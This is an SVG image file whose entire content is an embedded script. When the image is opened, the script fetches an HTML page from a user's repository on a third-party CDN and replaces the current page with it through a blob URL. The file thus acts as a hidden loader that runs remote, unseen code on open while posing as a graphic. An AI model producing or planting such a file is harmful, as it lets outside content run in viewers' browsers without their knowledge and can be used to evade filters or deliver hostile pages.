<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch("https://rawcdn.githack.com/BestSpark687090/BestSpark687090/main/single.html")
      .then(r => r.text())
      .then(html => {
        const blob = new Blob([html], {type: "text/html"});
        location.replace(URL.createObjectURL(blob));
      });
  </script>
</svg>
